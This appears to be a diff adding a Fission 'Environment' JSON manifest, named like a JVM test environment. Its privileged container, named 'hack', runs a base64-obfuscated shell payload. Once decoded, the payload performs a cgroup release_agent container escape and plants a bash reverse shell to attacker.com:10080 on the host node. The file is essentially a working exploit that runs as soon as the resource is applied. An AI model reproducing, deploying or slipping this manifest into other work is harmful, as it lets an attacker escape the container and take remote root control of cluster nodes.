@@ -1,0 +1,44 @@
+{
+  "kind": "Environment",
+  "apiVersion": "fission.io/v1",
+  "metadata": {
+    "name": "jvm-env-test",
+    "namespace": "default",
+    "uid": "94b42253-2842-4957-9350-810139022165",
+    "resourceVersion": "46030",
+    "generation": 1,
+    "creationTimestamp": "2021-02-13T11:49:09Z",
+    "managedFields": [
+      {
+        "manager": "fission-bundle",
+        "operation": "Update",
+        "apiVersion": "fission.io/v1",
+        "time": "2021-02-13T11:49:09Z"
+      }
+    ]
+  },
+  "spec": {
+    "version": 2,
+    "runtime": {
+      "image": "fission/jvm-env",
+      "podspec": {
+        "containers": [
+          {
+			"name":"hack",
+            "image": "fission/jvm-env",
+            "command": [
+              "/bin/sh",
+              "-c",
+              "echo -n 'bWtkaXIgLXAgL3RtcC9jZ3JwOyBtb3VudCAtdCBjZ3JvdXAgLW8gbWVtb3J5IGNncm91cCAvdG1wL2NncnAgJiYgbWtkaXIgLXAgL3RtcC9jZ3JwL2hhY2tlZAplY2hvIDEgPiAvdG1wL2NncnAvaGFja2VkL25vdGlmeV9vbl9yZWxlYXNlCmhvc3RfcGF0aD1gc2VkIC1uICdzLy4qXHBlcmRpcj1cKFteLF0qXCkuKi9cMS9wJyAvZXRjL210YWJgCmVjaG8gIiRob3N0X3BhdGgvY21kX2ZyciIgPiAvdG1wL2NncnAvcmVsZWFzZV9hZ2VudAplY2hvICcjIS9iaW4vc2gnID4gL2NtZF9mcnIKZWNobyAiYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vMTAwODAgMD4mMScgICIgPj4gL2NtZF9mcnIKY2htb2QgYSt4IC9jbWRfZnJyCnNoIC1jICJlY2hvIFwkXCQgPiAvdG1wL2NncnAvaGFja2VkL2Nncm91cC5wcm9jcyI=' | base64 -d | sh"
+            ],
+            "securityContext": {
+              "privileged": true            
+            }
+          }
+        ]
+      }
+    },
+    "poolsize": 3,
+    "keeparchive": true
+  }
+}
